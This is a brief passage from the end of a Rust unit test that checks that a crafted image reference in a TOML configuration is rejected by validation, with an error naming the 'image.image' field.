        let err = Config::parse(toml).expect_err("crafted ref must fail validation");
        assert!(err.to_string().contains("image.image"), "{err}");
    }
}
